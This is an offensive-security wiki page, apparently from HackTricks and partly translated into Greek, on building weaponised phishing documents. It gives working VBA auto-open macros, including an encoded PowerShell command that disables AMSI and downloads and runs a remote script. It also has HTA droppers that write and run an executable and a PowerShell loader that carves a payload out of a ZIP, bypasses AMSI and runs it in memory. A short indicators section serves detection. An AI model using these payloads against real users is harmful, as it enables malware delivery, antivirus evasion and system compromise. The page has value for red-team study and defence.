# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word εκτελεί έλεγχο εγκυρότητας των δεδομένων αρχείου πριν από το άνοιγμα ενός αρχείου. Ο έλεγχος εγκυρότητας πραγματοποιείται με τη μορφή ταυτοποίησης της δομής των δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την ταυτοποίηση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομαστεί το αρχείο αλλάζοντας την επέκταση και να διατηρηθούν οι δυνατότητές του εκτέλεσης macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros, εκ κατασκευής, αλλά ένα αρχείο DOCM μετονομασμένο σε RTF θα χειριστείται από το Microsoft Word και θα είναι ικανό να εκτελεί macros.\
Τα ίδια εσωτερικά στοιχεία και μηχανισμοί ισχύουν για όλο το λογισμικό του Microsoft Office Suite (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελεστούν από ορισμένα προγράμματα του Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Φόρτωση Εξωτερικής Εικόνας

Πήγαινε σε: _Insert --> Quick Parts --> Field_\
_**Κατηγορίες**: Links and References, **Ονόματα πεδίων**: includePicture, και **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Είναι δυνατό να χρησιμοποιηθούν macros για να τρέξουν αυθαίρετο κώδικα από το έγγραφο.

#### Συναρτήσεις αυτόματης φόρτωσης

Όσο πιο κοινές είναι, τόσο πιο πιθανό το AV να τις ανιχνεύσει.

- AutoOpen()
- Document_Open()

#### Παραδείγματα Κώδικα Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Αφαιρέστε χειροκίνητα μεταδεδομένα

Πηγαίνετε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα εμφανίσει το Document Inspector. Κάντε κλικ στο **Inspect** και μετά στο **Remove All** δίπλα στο **Document Properties and Personal Information**.

#### Προέκταση αρχείου

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Κάντε αυτό γιατί **δεν μπορείτε να αποθηκεύσετε macros μέσα σε ένα `.docx`** και υπάρχει ένα **στίγμα** γύρω από την macro-enabled **`.docm`** επέκταση (π.χ. το εικονίδιο μικρογραφίας έχει ένα μεγάλο `!` και ορισμένες web/email πύλες τα μπλοκάρουν εντελώς). Επομένως, αυτή η **παλαιά επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και γλώσσες scripting (όπως VBScript και JScript)**. Δημιουργεί τη διεπαφή χρήστη και εκτελείται ως εφαρμογή "fully trusted", χωρίς τους περιορισμούς του μοντέλου ασφάλειας ενός browser.

Ένα HTA εκτελείται χρησιμοποιώντας **`mshta.exe`**, το οποίο συνήθως εγκαθίσταται μαζί με τον **Internet Explorer**, καθιστώντας **`mshta` εξαρτημένο από τον IE**. Έτσι, αν αυτός έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός NTLM Authentication

Υπάρχουν αρκετοί τρόποι να **force NTLM authentication "remotely"**, για παράδειγμα, μπορείτε να προσθέσετε **invisible images** σε emails ή HTML που θα ανοίξει ο χρήστης (ακόμα και HTTP MitM?). Ή να στείλετε στο θύμα τη **address of files** που θα **trigger** μια **authentication** απλά με το **opening the folder.**

**Ελέγξτε αυτές τις ιδέες και περισσότερα στις ακόλουθες σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή την authentication αλλά και να **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Πολύ αποτελεσματικές καμπάνιες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα decoy documents (PDF/DOCX) και ένα κακόβουλο .lnk. Το κόλπο είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από έναν μοναδικό marker, και το .lnk το carve-άρει και το τρέχει πλήρως στη μνήμη.

Τυπική ροή που υλοποιείται από το .lnk PowerShell one-liner:

1) Εντοπίζει το αρχικό ZIP σε κοινές διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, και τον parent του current working directory.  
2) Διαβάζει τα bytes του ZIP και βρίσκει έναν hardcoded marker (π.χ., xFIQCV). Ό,τι βρίσκεται μετά το marker είναι το embedded PowerShell payload.  
3) Αντιγράφει το ZIP σε %ProgramData%, το εξάγει εκεί, και ανοίγει το decoy .docx για να φαίνεται νόμιμο.  
4) Παρακάμπτει το AMSI για τη τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Deobfuscate το επόμενο στάδιο (π.χ., αφαιρεί όλους τους χαρακτήρες #) και το εκτελεί στη μνήμη.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Σημειώσεις
- Η παράδοση συχνά καταχράται αξιόπιστα PaaS subdomains (π.χ., *.herokuapp.com) και μπορεί να gate-άρει τα payloads (σερβίροντας benign ZIPs με βάση IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc για να ελαχιστοποιήσει τα disk artifacts.

Persistence used in the same chain
- COM TypeLib hijacking του Microsoft Web Browser control ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή που το ενσωματώνει να επανεκκινήσει το payload αυτόματα. Δείτε λεπτομέρειες και έτοιμες εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files που περιέχουν το ASCII marker string (π.χ., xFIQCV) προστιθέμενο στα δεδομένα του archive.
- .lnk που απαριθμεί φακέλους parent/user για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Μακροχρόνια business threads που καταλήγουν σε links hosted under trusted PaaS domains.

## Windows αρχεία για κλοπή NTLM hashes

Δείτε τη σελίδα για **μέρη για κλοπή NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Αναφορές

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
